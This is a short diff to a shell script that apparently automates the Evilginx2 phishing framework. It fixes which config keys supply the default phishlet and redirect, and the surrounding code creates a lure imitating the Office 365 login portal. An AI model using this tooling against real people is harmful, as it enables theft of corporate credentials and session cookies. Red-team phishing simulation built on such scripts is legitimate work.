@@ -41,8 +41,8 @@ domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
 host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
 ssl_key_path=$(jq -r '.EvilGinx2.SSL_Key_Path' "$config_file")
 ssl_crt_path=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")
-default_phishlet=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")
-default_redirect=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")
+default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
+default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
 
 # Automate multiple lure creation
 create_lure $default_phishlet $domain_name "https://portal.office.com"
